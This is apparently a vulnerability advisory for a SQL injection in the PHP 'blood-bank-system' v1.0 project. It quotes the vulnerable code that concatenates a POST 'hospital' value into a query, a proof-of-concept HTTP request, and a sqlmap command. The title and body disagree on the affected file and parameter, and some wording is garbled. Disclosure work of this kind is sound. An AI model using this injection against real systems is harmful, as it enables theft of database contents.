# blood-bank-system-in-php register.php $user via sql injection

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

/admin/campsfetails.php  $hospital parameter.

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

network remote.

## Vulnerability Type

time sql injection via emote network.

## Root Cause

In campsdetails.php , SQL injection is used to obtain database information via $hospital parameter.

## Impact

## **Description of the vulnerability**

### campsdetails.php

In the source code，the    $hospital parameter is not filtered and concatenated into the SQL statement.        

```
$hospital=$_POST['hospital'];
$address=$_POST['address'];
$city=$_POST['city'];
$contact=$_POST['contact'];
$date=$_POST['date'];
$time=$_POST['time'];
$s = "select * from camps where hospital= '$hospital'";
```

​                                                                                                                                                                                                                                                                                                                                                                                                    

![image-20241006015301012](https://github.com/user-attachments/assets/16353675-c358-4927-8cc0-52225ffbc76a)



## **Vulnerability recurrence**

### **POC**

```
POST /admin/campsdetails.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/admin/campsdetails.php
Cookie: PHPSESSID=06sabebobepk0qakrr2v47ajkh
Upgrade-Insecure-Requests: 1
Priority: u=0, i

hospital=2
```

save the date as 2.txt

excute the command.

```
python sqlmap.py -r "2.txt"
```

see it.

![image-20241006015556519](https://github.com/user-attachments/assets/0e5355be-00bd-4a2a-a7e8-75697a950d59)

